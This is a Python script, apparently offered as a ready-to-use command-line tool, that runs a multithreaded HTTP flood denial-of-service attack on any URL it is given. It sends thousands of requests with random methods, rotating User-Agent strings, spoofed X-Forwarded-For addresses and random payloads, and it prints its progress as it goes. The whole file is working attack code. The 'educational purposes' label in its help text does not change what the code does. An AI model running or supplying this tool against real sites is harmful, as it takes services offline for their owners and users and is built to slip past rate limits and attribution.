import threading
import requests
import random
import argparse
import sys
from colorama import init, Fore, Style

init(autoreset=True)

THREADS = 50
REQUESTS_PER_THREAD = 250

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 11)"
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE"]

def random_string(length=8):
    letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(letters) for _ in range(length))

def http_flood(target_url):
    for _ in range(REQUESTS_PER_THREAD):
        method = random.choice(HTTP_METHODS)
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Connection": "keep-alive",
            "X-Forwarded-For": ".".join(str(random.randint(0,255)) for _ in range(4))
        }
        data = {random_string(5): random_string(8) for _ in range(random.randint(1, 5))}

        try:
            if method == "GET":
                res = requests.get(target_url, headers=headers, params=data, timeout=2)
            elif method == "POST":
                res = requests.post(target_url, headers=headers, data=data, timeout=2)
            elif method == "PUT":
                res = requests.put(target_url, headers=headers, data=data, timeout=2)
            elif method == "DELETE":
                res = requests.delete(target_url, headers=headers, data=data, timeout=2)
            else:
                continue
            print(Fore.GREEN + f"[{method}] Sent: {res.status_code}")
        except Exception as e:
            print(Fore.RED + f"[{method}] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Aggressive HTTP Flood DoS tool for educational purposes.")
    parser.add_argument('-u', '--url', required=True, help='Target URL or IP (including http:// or https://)')
    args = parser.parse_args()

    target_url = args.url
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        print(Fore.RED + "Error: URL must start with http:// or https://")
        sys.exit(1)

    print(Fore.GREEN + f"Starting AGGRESSIVE HTTP Flood on {target_url} ...")
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=http_flood, args=(target_url,))
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print(Fore.GREEN + "HTTP Flood attack complete.")

if __name__ == "__main__":
    main()